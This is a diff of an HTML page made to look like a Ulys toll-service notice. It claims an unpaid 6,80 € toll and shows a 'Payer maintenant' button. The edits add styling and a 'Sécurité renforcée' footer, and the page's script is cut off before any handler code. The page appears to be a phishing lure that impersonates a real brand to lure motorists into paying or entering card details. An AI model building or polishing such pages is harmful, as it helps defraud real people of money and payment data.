@@ -8,14 +8,14 @@
 </head>
 <body>
 
-  <!-- BINDEAU HAUT BLANC -->
+  <!-- BANDEAU HAUT -->
   <div class="top-nav">
     <a href="#"><span>👤</span> Mon espace</a>
     <a href="#" class="btn-primary">Devenir client</a>
     <div class="lang">FR ▼</div>
   </div>
 
-  <!-- NAVBAR PRINCIPALE BLANCHE -->
+  <!-- NAVIGATION PRINCIPALE -->
   <div class="site-nav">
     <nav class="navbar">
       <div class="navbar-left">
@@ -36,12 +36,13 @@
     </nav>
   </div>
 
-  <!-- CONTEXTE AVANT INFO -->
-  <main class="context-container">
-    <p class="context-header">Merci de régler votre passage&nbsp;!</p>
+  <!-- CONTENU PRINCIPAL -->
+  <main class="main container">
+    <p class="context-header" style="text-align:center; margin-top: 1.5rem;">Merci de régler votre passage&nbsp;!</p>
     <div class="card context-card">
-      <img src="assets/images/logo-ulys2.png" alt="Ulys" class="context-logo"/>
-      <h2 class="context-title">Paiement refusé – 6,80 € à régler</h2>
+      <img src="assets/images/logo-ulys2.png" alt="Ulys" class="context-logo" style="display:block; margin: 0 auto 1.5rem; max-width: 120px;"/>
+      <h2 style="text-align:center; color:#1a1a1a; margin-bottom:1.5rem;">Paiement refusé – 6,80 € à régler</h2>
+
       <p class="context-text">Bonjour,</p>
       <p class="context-text">
         Nous avons constaté que votre dernier passage au péage n’a pas été réglé.<br/>
@@ -54,9 +55,14 @@
         Ce solde peut être réglé facilement en ligne en cliquant sur le bouton ci-dessous.<br/>
         Une fois le paiement effectué, aucune autre démarche ne sera nécessaire.
       </p>
+
       <button id="btn-pay" class="btn btn-danger">Payer maintenant</button>
     </div>
   </main>
+
+  <footer>
+    &copy; 2025 Ulys. Sécurité renforcée.
+  </footer>
 
   <script>
     document.getElementById('btn-pay').addEventListener('click', function(){
